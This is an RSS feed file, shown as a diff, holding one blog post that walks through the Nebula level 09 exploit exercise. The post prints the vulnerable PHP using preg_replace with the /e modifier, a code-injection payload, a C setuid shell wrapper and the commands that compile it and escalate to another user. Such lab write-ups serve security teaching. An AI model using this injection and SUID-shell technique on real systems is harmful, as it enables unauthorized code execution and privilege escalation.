@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Injection on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/injection/index.xml</link>
+    <description>Recent content in Injection on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/injection/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Exploit Exercises - Nebula 09</title>
+      <link>https://www.mattandreko.com/blog/2011-12-10-exploit-exercises-nebula-09/</link>
+      <pubDate>Sat, 10 Dec 2011 05:46:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2011-12-10-exploit-exercises-nebula-09/</guid>
+      <description>&lt;p&gt;Challenge 09 gave me the most issues out of any other challenge so far.  This may just be because I haven&amp;rsquo;t touched PHP since version 3 was just coming out.  However, it is based on a dangerous function, known as &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace()&lt;/a&gt;.  There are several more dangerous functions, some of which can be seen &lt;a href=&#34;http://stackoverflow.com/questions/3115559/exploitable-php-functions&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The challenge starts by giving us the source code of the program we will be exploiting.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+function spam($email)
+{
+  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
+  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
+  
+  return $email;
+}
+
+function markup($filename, $use_me)
+{
+  $contents = file_get_contents($filename);
+
+  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
+  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
+  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);
+
+  return $contents;
+}
+
+$output = markup($argv[1], $argv[2]);
+
+print $output;
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What I noticed immediately, was that the program accepted 2 arguments, but never used the second one, other than to pass it into the &amp;ldquo;markup&amp;rdquo; function as &amp;ldquo;$use_me&amp;rdquo;.  This seemed odd, so I figured it had to do something with that.  I also thought at first that the &amp;ldquo;spam&amp;rdquo; function was never being called, but then noticed it in quotes on the first line of &amp;ldquo;preg_replace&amp;rdquo; statements.  I had to look this function up, and find out that it would evaluate the code at run-time.  This means that I needed to inject code into that call to &amp;ldquo;spam()&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;I tried doing some basic injection to try to get something equivelent to it calling:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;spam(&amp;quot;&amp;quot;);system(&amp;quot;/bin/bash&amp;quot;);print(&amp;quot;&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However this never worked, because of the &lt;a href=&#34;http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;PCRE modifiers&lt;/a&gt; built into PHP.  They automatically will escape single and double quotes, as well as backticks (at least according to the docs).  I spent &lt;b&gt;hours&lt;/b&gt; trying to inject various strings to get some sort of code execution.&lt;/p&gt;
+
+&lt;p&gt;Somewhere along the line, I read a page (sorry I can&amp;rsquo;t seem to find it again) where they mentioned using an alternative syntax to the backreferences in preg_replace.  So instead of using \2, you could use ${2}.  This is covered slightly on the &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace&lt;/a&gt; php function reference.  What that reference doesn&amp;rsquo;t show, is that you can apparently have that not just reference parameters, but any variable in the code.  After tinkering a while, I settled on a pattern.  I created a file named, /tmp/level09.txt&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[email {${`$use_me`}}]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Firstly, I had to start with &amp;ldquo;[email &amp;ldquo; and end with &amp;ldquo;]&amp;rdquo; to get it into this regex at all.  Because of the PCRE modifiers, I used back-ticks, because in researching them, I ran across a &lt;a href=&#34;http://www.madirish.net/node/437&#34;&gt;blog post&lt;/a&gt; saying that back-ticks were able to bypass them somehow.  So with variable expansion, and the PCRE modifier bypass, this should let me inject some code into the function.&lt;/p&gt;
+
+&lt;p&gt;Because running a &amp;ldquo;system()&amp;rdquo; or &amp;ldquo;exec()&amp;rdquo; method in the php caused me problems with interactivity, I opted to use commands that required no interaction at run-time.  I again used my /tmp/bash_id.c file from challenge 07:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+int main(int argc, char *argv[])
+{
+    if (argc != 2)
+        printf(&amp;quot;usage: %s &amp;lt;user id&amp;gt;\n&amp;quot;, argv[0]);
+    else {
+        int i = atoi(argv[1]);
+        setresuid(i, i, i);
+        setresgid(i, i, i);
+        system( &amp;quot;/bin/bash&amp;quot; );
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then would call the compiled SUID version of the php file with 2 parameters.  The first would be the text file I wanted to parse, and the second would be the commands I wanted to run, which would get inserted into the $use_me variable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/level09.txt &amp;quot;gcc -o /home/flag09/bash_id /tmp/bash_id.c;chmod +s,a+rwx /home/flag09/bash_id&amp;quot;
+PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This compiled my bash_id.c source file to the flag09 user&amp;rsquo;s home directory, and marked it SUID.  I ignored the PHP Notice, since I knew I was tinkering.&lt;/p&gt;
+
+&lt;p&gt;After making sure the bash_id program did get created properly, I just needed to call it with the userid of flag09 as the first parameter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./bash_id `cat /etc/passwd | grep flag09 | cut -d : -f 3`
+flag09@nebula:/home/flag09$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This apparently worked, so I ran the &amp;ldquo;getflag&amp;rdquo; command as usual, marking completion of this challenge.  This was by far the most guessing I&amp;rsquo;ve had to do on any of the challenges so far.  I really hope that I don&amp;rsquo;t get stuck soon, leaving me unable to continue on.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
